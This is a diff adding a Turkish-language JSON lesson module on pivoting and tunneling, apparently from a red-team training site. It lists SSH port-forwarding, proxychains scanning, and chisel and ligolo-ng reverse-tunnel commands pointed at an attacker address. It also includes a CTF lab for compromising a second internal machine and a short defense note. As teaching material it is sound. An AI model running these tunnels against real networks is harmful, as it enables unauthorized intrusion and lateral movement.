@@ -1,0 +1,123 @@
+{
+  "id": "pivoting",
+  "slug": "pivoting",
+  "title": "Pivoting & Tunneling",
+  "subtitle": "İç Ağa Sıçrama ve Tünelleme",
+  "description": "Ele geçirilen bir makineyi köprü olarak kullanıp erişilemeyen iç ağlara ulaşma: SSH tünelleme, port yönlendirme, proxychains, chisel ve ligolo ile pivoting.",
+  "team": "red-team",
+  "category": "Yanal Hareket & Tünelleme",
+  "phase": "Post-Exploitation",
+  "icon": "🔀",
+  "color": "#ef4444",
+  "tags": ["pivoting", "tunneling", "ssh", "proxychains", "chisel", "port forwarding", "ligolo"],
+  "modules": [
+    {
+      "id": "ssh-tunneling",
+      "title": "SSH Tünelleme ve Port Yönlendirme",
+      "description": "Local/Remote/Dynamic port forwarding mantığı ve kullanımı",
+      "difficulty": "intermediate",
+      "duration": "25 dk",
+      "sections": [
+        {
+          "id": "theory",
+          "type": "theory",
+          "title": "Pivoting Mantığı",
+          "content": "**Pivoting:** Ele geçirdiğin makine (pivot) iki ağa bağlıdır — senin eriştiğin ağ ve **erişemediğin iç ağ**. Bu makineyi köprü yaparak iç ağdaki sistemlere ulaşırsın.\n\n**Senaryo:**\n```\nSen (10.10.14.1) → Pivot (10.10.10.5 / 172.16.0.5) → İç ağ (172.16.0.0/24)\n```\nİç ağdaki 172.16.0.10'a doğrudan erişemezsin ama pivot üzerinden erişebilirsin.\n\n**SSH Port Forwarding türleri:**\n| Tür | Bayrak | Ne yapar |\n|-----|--------|----------|\n| Local | -L | Yerel portu → uzak hedefe yönlendir |\n| Remote | -R | Uzak portu → yerel hedefe yönlendir |\n| Dynamic | -D | SOCKS proxy (proxychains ile tüm araçlar) |\n\n**CTF ipucu:** Bir makinede ikinci bir ağ arayüzü (ip addr ile 172.x, 192.168.x) görürsen → pivoting zamanı."
+        },
+        {
+          "id": "commands",
+          "type": "commands",
+          "title": "SSH Tünelleme Komutları",
+          "commands": [
+            {
+              "command": "ssh -L 8080:172.16.0.10:80 kullanici@10.10.10.5",
+              "description": "Local forward: yerel 8080 → iç ağdaki 172.16.0.10:80",
+              "tip": "Artık localhost:8080 = iç ağdaki web sunucusu. Tek hedef portu için idealdir.",
+              "flags": [
+                { "flag": "-L yerel:hedef:port", "description": "Local port forwarding" },
+                { "flag": "-N", "description": "Komut çalıştırma, sadece tünel" },
+                { "flag": "-f", "description": "Arka plana al" }
+              ]
+            },
+            {
+              "command": "ssh -D 9050 kullanici@10.10.10.5",
+              "description": "Dynamic forward: SOCKS proxy aç (tüm iç ağa erişim)",
+              "tip": "9050 proxychains'in varsayılan portudur. Bir tünelle tüm iç ağı tarayabilirsin."
+            },
+            {
+              "command": "proxychains nmap -sT -Pn 172.16.0.10",
+              "description": "proxychains ile SOCKS üzerinden iç ağı tara",
+              "tip": "/etc/proxychains4.conf'a 'socks5 127.0.0.1 9050' ekle. -sT (TCP connect) proxy üzerinden çalışır.",
+              "flags": [
+                { "flag": "-sT", "description": "TCP connect scan (proxy uyumlu)" },
+                { "flag": "-Pn", "description": "Ping atlatma (proxy'de gerekli)" }
+              ]
+            },
+            {
+              "command": "ssh -R 4444:127.0.0.1:4444 kullanici@10.10.10.5",
+              "description": "Remote forward: pivot'tan sana geri bağlantı (reverse shell pivot)",
+              "tip": "İç ağdaki bir makineden reverse shell almak için pivot üzerinden geri yönlendirme."
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "chisel-ligolo",
+      "title": "Chisel & Ligolo + Lab",
+      "description": "SSH yokken modern tünelleme araçları",
+      "difficulty": "advanced",
+      "duration": "25 dk",
+      "sections": [
+        {
+          "id": "commands",
+          "type": "commands",
+          "title": "Chisel ile Tünelleme",
+          "commands": [
+            {
+              "command": "# Saldırgan (sunucu):\nchisel server -p 8000 --reverse\n# Hedef/pivot (istemci):\n./chisel client 10.10.14.1:8000 R:socks",
+              "description": "Chisel reverse SOCKS proxy — SSH olmayan (Windows dahil) pivotlarda",
+              "tip": "R:socks reverse SOCKS açar. proxychains'i 127.0.0.1:1080'e ayarla. Chisel HTTP üzerinden çalışır, firewall dostu.",
+              "warning": "Chisel binary'sini hedefe transfer etmen gerekir (file-transfer modülüne bak)."
+            },
+            {
+              "command": "# Tek port yönlendirme (chisel):\n./chisel client 10.10.14.1:8000 R:8080:172.16.0.10:80",
+              "description": "Chisel ile belirli port yönlendirme",
+              "tip": "İç ağdaki tek bir servise hızlı erişim için."
+            },
+            {
+              "command": "# Ligolo-ng (modern alternatif):\n# Saldırgan: ./proxy -selfcert\n# Hedef: ./agent -connect 10.10.14.1:11601 -ignore-cert",
+              "description": "Ligolo-ng — TUN arayüzü ile şeffaf pivoting (proxychains gerekmez)",
+              "tip": "Ligolo bir sanal ağ arayüzü oluşturur; araçları normal çalıştırırsın (proxychains'siz). Modern favoridir."
+            }
+          ]
+        },
+        {
+          "id": "lab",
+          "type": "lab",
+          "title": "CTF Senaryosu: İç Ağa Sıçrama",
+          "scenario": {
+            "title": "Pivot → İç Ağ Keşfi → İkinci Makine",
+            "objective": "İlk makineyi ele geçir, ikinci bir ağ arayüzü keşfet, pivoting ile iç ağı tara ve erişilemeyen ikinci makineye ulaşıp ele geçir.",
+            "environment": "Çok makineli ağ lab'ı (HTB Pro Labs / TryHackMe network room)",
+            "difficulty": "advanced",
+            "steps": [
+              "İlk makinede: ip addr / ifconfig ile ikinci ağı (172.16.x) keşfet",
+              "SOCKS tünel aç: ssh -D 9050 user@pivot VEYA chisel reverse socks",
+              "proxychains.conf'u ayarla (socks5 127.0.0.1 9050)",
+              "İç ağı tara: proxychains nmap -sT -Pn 172.16.0.0/24",
+              "Bulunan açık servislere proxychains ile bağlan (ssh, http, smb)",
+              "İkinci makineyi ele geçir, gerekirse oradan tekrar pivot yap (double pivot)"
+            ],
+            "hints": [
+              "proxychains yalnızca TCP connect (-sT) taramayı destekler, SYN değil",
+              "Ligolo-ng kullanırsan proxychains'e gerek kalmaz, araçlar normal çalışır",
+              "Tarama yavaşsa port aralığını daralt (-p 22,80,445,3389)"
+            ],
+            "defenseNote": "Savunma: İç ağ segmentasyonu (mikro segmentasyon), doğu-batı trafiğini kısıtla, beklenmedik tünel/SOCKS trafiğini tespit et, çok-arayüzlü makineleri sıkılaştır ve anormal yatay bağlantıları SIEM ile izle."
+          }
+        }
+      ]
+    }
+  ]
+}
